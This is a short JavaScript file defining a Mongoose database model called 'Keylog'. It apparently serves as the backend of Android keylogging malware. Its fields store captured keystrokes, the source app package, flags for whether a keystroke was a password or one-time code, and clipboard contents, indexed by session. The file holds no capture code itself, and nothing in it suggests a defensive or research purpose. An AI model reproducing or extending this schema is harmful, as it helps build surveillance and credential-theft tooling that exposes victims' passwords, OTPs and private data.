const mongoose = require('mongoose');

const keylogSchema = new mongoose.Schema({
  sessionId: {
    type: String,
    required: true,
  },
  keystroke: {
    type: String,
    required: true,
  },
  timestamp: {
    type: Date,
    default: Date.now,
  },
  appPackage: {
    type: String,
    default: '',
  },
  isPassword: {
    type: Boolean,
    default: false,
  },
  isOtp: {
    type: Boolean,
    default: false,
  },
  clipboard: {
    type: String,
    default: '',
  },
}, {
  timestamps: true,
});

keylogSchema.index({ sessionId: 1, timestamp: -1 });

module.exports = mongoose.model('Keylog', keylogSchema);